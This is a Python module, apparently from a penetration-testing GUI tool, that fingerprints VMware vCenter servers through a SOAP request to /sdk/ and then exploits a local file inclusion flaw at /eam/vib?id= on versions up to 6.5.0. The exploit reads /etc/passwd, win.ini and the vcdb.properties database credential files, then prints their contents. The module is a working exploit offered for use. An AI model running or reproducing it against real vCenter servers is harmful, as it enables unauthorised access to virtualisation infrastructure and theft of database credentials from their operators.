import re
import json
from packaging.version import Version
import requests
from utils.output import output_format,output_simple_table
from utils.test_url_connection import test_url_connection

class VcenterInfo:
    def __init__(self, url_text, result_text, update_date):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.result_text = result_text
        self.update_date = update_date
        self.hostname = self.url.replace("http://", "").replace("https://", "").split(':')[0]

    def vcenter_basic_info_detection(self):
        url = f"{self.url}/sdk/"
        headers = {
            "Host": self.hostname,
            "Content-Type": "text/xml",
        }
        soap_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
       <soap:Header>
          <operationID>00000001-00000001</operationID>
       </soap:Header>
       <soap:Body>
          <RetrieveServiceContent xmlns="urn:internalvim25">
             <_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this>
          </RetrieveServiceContent>
       </soap:Body>
    </soap:Envelope>
    """
        try:
            response = requests.post(url, headers=headers, data=soap_payload, verify=False, allow_redirects=False)
            response_text = response.text
            if response.status_code == 200:
                if any(word in response_text for word in ['ha-folder-root', 'RetrieveServiceContentResponse']):
                    pattern = r"<name>(.*?)</name>|<version>(.*?)</version>|<build>(.*?)</build>|<osType>(.*?)</osType>|<productLineId>(.*?)</productLineId>|<apiType>(.*?)</apiType>"
                    matches = re.findall(pattern, response_text, re.DOTALL)
                    if matches:
                        data = {
                            "name": None,
                            "version": None,
                            "build": None,
                            "osType": None,
                            "productLineId": None,
                            "apiType": None
                        }
                        for match in matches:
                            for i, group in enumerate(match):
                                if group:
                                    data[list(data.keys())[i]] = group
                        self.vcsa_version = data["version"]
                        return data
                    else:
                        return {"Error": "0"}
                else:
                    return {"Error": "0"}
            else:
                return {"Error": "0"}
        except Exception as e:
            return {"Error": str(e)}

    def check_lfi_and_os(self):
        try:
            windows_lfi_vuln_url = f"{self.url}/eam/vib?id=C:\\Windows\\win.ini"
            windows_lfi_vuln_resp = requests.get(windows_lfi_vuln_url, verify=False, allow_redirects=False)
            if "for 16-bit app support" in windows_lfi_vuln_resp.text and windows_lfi_vuln_resp.status_code == 200:
                return 1, "windows"
            else:
                linux_lfi_vuln_url = f"{self.url}/eam/vib?id=/etc/passwd"
                linux_lfi_vuln_resp = requests.get(linux_lfi_vuln_url, verify=False, allow_redirects=False)
                if ("vsphere-client" or "vpostgres") in str(linux_lfi_vuln_resp.text) and linux_lfi_vuln_resp.status_code == 200:
                    return 1, "linux"
                else:
                    return 0, ""
        except:
            return 0, ""

    def exploit_lfi_vuln(self, os):
        windows_vuln_paths = [
            "C:\\ProgramData\\VMware\\VMware+VirtualCenter\\vcdb.properties",
            "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter\\vcdb.properties",
            "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"
        ]
        linux_vuln_paths = [
            "/etc/vmware-vpx/vcdb.properties",
            "/etc/vmware/service-state/vpxd/vcdb.properties",
            "/etc/passwd"
        ]
        if os == "windows":
            found_200 = False
            for wpath in windows_vuln_paths:
                vuln_url = f"{self.url}/eam/vib?id={wpath}"
                try:
                    resp = requests.get(vuln_url, verify=False, allow_redirects=False)
                    if resp.status_code == 200:
                        found_200 = True
                        return 1, wpath, resp.content
                    else:
                        continue
                except:
                    continue
            if not found_200:
                return 0, "", ""
        if os == "linux":
            found_200 = False
            for lpath in linux_vuln_paths:
                vuln_url = f"{self.url}/eam/vib?id={lpath}"
                try:
                    resp = requests.get(vuln_url, verify=False, allow_redirects=False)
                    if resp.status_code == 200:
                        found_200 = True
                        return 1, lpath, resp.content
                    else:
                        continue
                except:
                    continue
            if not found_200:
                return 0, "", ""

    def vcenter_lfi_windows_and_linux(self):
        vuln_version = Version("6.5.0")
        vcenter_version = Version(self.vcsa_version)
        if vcenter_version > vuln_version:
            self.update_date.emit(output_format("INFO", "The vCenter system is higher than 6.5.0 and does not have a local file inclusion vulnerability."))
        else:
            status, os = self.check_lfi_and_os()
            if(status):
                self.os = os
                self.update_date.emit(output_format("SUCCESS", f"The vCenter system (built on the {self.os} platform) has been confirmed to have a local file inclusion vulnerability and the program will begin attempting to exploit it!"))
                lfi_exp_status, vuln_path, sensitive_content = self.exploit_lfi_vuln(self.os)
                sensitive_content_dict = {"Path": vuln_path, "Content": sensitive_content.decode()}
                if(lfi_exp_status):
                    self.update_date.emit(output_format("SUCCESS", f"The sensitive file contents of the vCenter system will be displayed as follows:"))
                    self.update_date.emit(output_simple_table(sensitive_content_dict, "vCenter system sensitive file contents", 60))
                else:
                    self.update_date.emit(output_format("FAILED", "The vCenter system does indeed have a local file inclusion vulnerability, but reading the default database configuration file has failed. Please attempt manual exploitation."))
            else:
                self.update_date.emit(output_format("FAILED", "The vCenter system doesn't have a local file inclusion vulnerability."))

    def CollectVcenterInfo(self):
        if (not test_url_connection(self.url)):
            self.update_date.emit(output_format("ERROR", f"Unable to access {self.url}.Please check the network."))
        else:
            # collect vcenter basic info
            collect_result = self.vcenter_basic_info_detection()
            if "Error" in json.dumps(collect_result):
                self.update_date.emit(output_format("ERROR", f"Attempt to retrieve vCenter version failed.Please check the network or manually verify if it exists at '/sdk/' interface!"))
            else:
                self.update_date.emit(output_format("SUCCESS", f"Successfully retrieved vCenter basic information.They will be displayed in a table as follows:"))
                self.update_date.emit(output_simple_table(collect_result, "vCenter Basic Information", 60))
                # check lfi vulnerability
                self.vcenter_lfi_windows_and_linux()